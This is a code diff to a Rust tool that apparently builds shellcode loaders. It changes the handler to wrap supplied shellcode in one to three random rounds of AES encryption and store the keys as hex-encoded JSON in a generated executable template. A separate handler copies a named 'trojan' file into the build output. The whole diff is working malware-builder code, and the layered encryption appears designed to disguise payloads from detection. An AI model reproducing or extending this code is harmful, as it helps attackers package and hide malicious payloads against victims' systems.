@@ -1,10 +1,14 @@
+use std::collections::HashMap;
 use std::fs::{create_dir_all, read, remove_dir_all, write};
+use std::iter::Map;
 use std::path::Path;
 use std::process::{Command, Stdio};
 use std::ptr::null;
 
 use aes::Aes256;
+use rand::{Rng, thread_rng};
 use rust_embed::RustEmbed;
+use serde::{Deserialize, Serialize};
 
 use crate::utils;
 use crate::utils::aesEncrypt;
@@ -24,6 +28,13 @@ const base64Str_placeholder: &str = "${base64Str}";
 const package_placeholder: &str = "${packageName}";
 const hexCode_placeholder: &str = "${hexCode}";
 
+#[derive(Serialize, Deserialize)]
+pub struct ScInfo {
+    base64_str: String,
+    kv: Vec<(String, String)>,
+}
+
+
 impl Loader for ShellCodeHandler {
     fn load(&self) {
         println!("shellcode 处理中。。。");
@@ -41,13 +52,24 @@ impl Loader for ShellCodeHandler {
         let mainFile_str = std::str::from_utf8(mainFile.data.as_ref()).unwrap();
         let cargoToml_str = std::str::from_utf8(cargoToml.data.as_ref()).unwrap();
         let buildRs_str = std::str::from_utf8(buildRs.data.as_ref()).unwrap();
+        let mut tem_str: Vec<u8> = shellcode;
+        let mut vec = Vec::new();
+        let mut rng = thread_rng();
+        let loop_count = rng.gen_range(1..4);
+        for i in 0..loop_count {
+            let (key, iv, ciphertext) = aesEncrypt(&tem_str);
+            tem_str = ciphertext;
+            vec.push((key, iv))
+        }
 
-        let (key, iv, ciphertext) = aesEncrypt(shellcode);
 
-        let base64_str = base64::encode(&ciphertext);
-        let mainFile_str = &mainFile_str.replace(&iv_placeholder, &iv);
-        let mainFile_str = &mainFile_str.replace(&key_placeholder, &key);
-        let mainFile_str = &mainFile_str.replace(&hexCode_placeholder, &hex::encode(&base64_str));
+        let base64_str = base64::encode(&tem_str);
+        let info = ScInfo { base64_str, kv: vec };
+        let json_str = serde_json::to_string(&info).unwrap();
+
+        // let mainFile_str = &mainFile_str.replace(&iv_placeholder, &iv);
+        // let mainFile_str = &mainFile_str.replace(&key_placeholder, &key);
+        let mainFile_str = &mainFile_str.replace(&hexCode_placeholder, &hex::encode(&json_str));
         let cargoToml_str = &cargoToml_str.replace(&package_placeholder, &self.package_name);
 
 
@@ -107,7 +129,7 @@ impl Loader for BindHandler {
         let trojan_file = read(&self.trojan_file_path).expect(&format!("文件读取失败：{}", &self.trojan_file_path));
         let _ = write(format!("loader/tep/{}.exe", file_stem_name), trojan_file);
 
-         complie();
+        complie();
     }
 }
 
